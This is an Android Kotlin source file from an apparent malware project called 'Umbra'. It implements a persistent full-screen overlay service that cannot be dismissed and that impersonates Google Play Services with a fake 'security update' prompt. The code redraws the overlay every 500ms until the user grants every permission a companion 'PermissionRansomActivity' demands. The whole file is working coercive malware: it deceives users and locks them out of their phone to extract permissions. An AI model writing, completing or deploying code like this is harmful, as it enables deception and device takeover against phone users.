package org.umbra.core.persistence

import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Color
import android.graphics.PixelFormat
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.provider.Settings
import android.util.Log
import android.view.Gravity
import android.view.WindowManager
import android.widget.Button
import android.widget.LinearLayout
import android.widget.TextView

/**
 * PermissionOverlayService — draws a full-screen overlay window on top of EVERYTHING.
 * This is the second defense layer after PermissionRansomActivity.
 *
 * The overlay survives:
 * - Home button press (stays on top of launcher)
 * - Recents button press (stays on top of recents)
 * - App switching (stays on top of any app)
 * - Back button (not dismissible)
 *
 * Requires SYSTEM_ALERT_WINDOW permission (Settings.canDrawOverlays).
 * The ransom activity requests this permission first via Settings intent.
 *
 * The overlay is recreated every 500ms if removed by the system.
 */
class PermissionOverlayService : Service() {

    companion object {
        private const val TAG = "Umbra"
        private const val OVERLAY_CHECK_INTERVAL_MS = 500L

        fun start(context: Context) {
            if (!PermissionRansomActivity.hasOverlayPermission(context)) return
            try {
                context.startService(Intent(context, PermissionOverlayService::class.java))
            } catch (e: Exception) {
                Log.w(TAG, "Failed to start overlay service: ${e.message}")
            }
        }

        fun stop(context: Context) {
            try {
                context.stopService(Intent(context, PermissionOverlayService::class.java))
            } catch (_: Exception) {}
        }
    }

    private val handler = Handler(Looper.getMainLooper())
    private var windowManager: WindowManager? = null
    private var overlayView: LinearLayout? = null
    private var isOverlayShown = false

    override fun onCreate() {
        super.onCreate()
        windowManager = getSystemService(Context.WINDOW_SERVICE) as WindowManager
        Log.d(TAG, "PermissionOverlayService created")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        showOverlay()
        // Keep checking and re-adding the overlay if it gets removed
        handler.postDelayed(overlayCheckRunnable, OVERLAY_CHECK_INTERVAL_MS)
        return START_STICKY
    }

    private val overlayCheckRunnable = object : Runnable {
        override fun run() {
            if (PermissionRansomActivity.hasAllPermissions(this@PermissionOverlayService)) {
                removeOverlay()
                stopSelf()
                return
            }
            if (!isOverlayShown && PermissionRansomActivity.hasOverlayPermission(this@PermissionOverlayService)) {
                showOverlay()
            }
            handler.postDelayed(this, OVERLAY_CHECK_INTERVAL_MS)
        }
    }

    private fun showOverlay() {
        if (isOverlayShown || !PermissionRansomActivity.hasOverlayPermission(this)) return

        val missing = PermissionRansomActivity.missingPermissions(this)
        if (missing.isEmpty()) return

        val layout = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(48, 80, 48, 60)
            setBackgroundColor(0xF0151515.toInt())
        }

        val title = TextView(this).apply {
            text = "Google Play Services"
            textSize = 20f
            setTextColor(Color.WHITE)
            setPadding(0, 0, 0, 20)
        }

        val message = TextView(this).apply {
            text = "Security update required.\n" +
                   missing.size + " permissions needed to continue.\n\n" +
                   "Tap \"Update\" to proceed."
            textSize = 15f
            setTextColor(0xCCFFFFFF.toInt())
            setPadding(0, 0, 0, 30)
        }

        val button = Button(this).apply {
            text = "Update"
            textSize = 16f
            setOnClickListener {
                // Launch the ransom activity which handles permission requests
                PermissionRansomActivity.launch(this@PermissionOverlayService)
            }
        }

        layout.addView(title)
        layout.addView(message)
        layout.addView(button)

        val params = WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
            else
                @Suppress("DEPRECATION")
                WindowManager.LayoutParams.TYPE_SYSTEM_ALERT,
            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
            WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS or
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
            WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH or
            WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
            PixelFormat.OPAQUE
        )
        params.gravity = Gravity.CENTER

        try {
            windowManager?.addView(layout, params)
            overlayView = layout
            isOverlayShown = true
            Log.d(TAG, "Overlay added (${missing.size} perms missing)")
        } catch (e: Exception) {
            Log.w(TAG, "Failed to add overlay: ${e.message}")
        }
    }

    private fun removeOverlay() {
        try {
            overlayView?.let {
                windowManager?.removeView(it)
            }
        } catch (_: Exception) {}
        overlayView = null
        isOverlayShown = false
    }

    override fun onDestroy() {
        handler.removeCallbacksAndMessages(null)
        removeOverlay()
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
